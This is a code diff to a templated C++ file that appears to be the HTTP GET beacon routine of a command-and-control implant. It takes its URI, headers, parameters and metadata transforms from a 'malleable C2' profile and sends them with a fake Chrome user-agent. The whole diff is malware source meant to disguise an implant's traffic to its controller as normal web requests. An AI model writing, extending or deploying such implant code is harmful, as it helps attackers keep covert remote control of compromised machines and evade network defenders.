@@ -28,6 +28,7 @@ Required Keys:
 
 [% from 'transform.j2' import render_transform -%]
 [% from 'transform_reverse.j2' import render_reverse_transform -%]
+[% from 'http_add_headers_or_parameters.j2' import render_add_headers_or_parameters -%]
 
 
 nlohmann::json get(std::string implant_uuid) {
@@ -50,19 +51,25 @@ nlohmann::json get(std::string implant_uuid) {
             L"User-Agent: GoogleChrome", 
     };
 
-    // --- Transforms ---
-    //Transform metadata before it goes out to match the malleablec2 profile
-    [%- for transform in http_get_client_metadata_transforms_list %]
-    [[ render_transform(transform, 'metadata') ]]
-    [%- endfor %]
-    // --- End Transforms ---
-
     // --- Malleable C2 Metadata transport method ---
     //note - using scopes for each option
     // Start with the base URI from the profile
     std::wstring uri = L"[[ http_get_uri ]]";
     std::string request_body = ""; // NULL by default, as that's what the wininet wants
     std::wstring w_metadata(metadata.begin(), metadata.end()); //convert metadata str to w_metadata for winapi (wide)
+
+    // --- Add addtl headers/params as specified in mc2 ---
+    [%- for header_or_param in http_get_client_headers_or_parameters_list %]
+    [[ render_add_headers_or_parameters(header_or_param) ]]
+    [%- endfor %]
+    // --- end
+
+    // --- Transforms ---
+    //Transform metadata before it goes out to match the malleablec2 profile
+    [%- for transform in http_get_client_metadata_transforms_list %]
+    [[ render_transform(transform, 'metadata') ]]
+    [%- endfor %]
+    // --- End Transforms ---
 
     [# HTTP_GET: METADATA: HEADER - IF MC2 says it wants a header for where to find the metadata... #]
     [%- if http_get_client_metadata_terminator == "header" %]
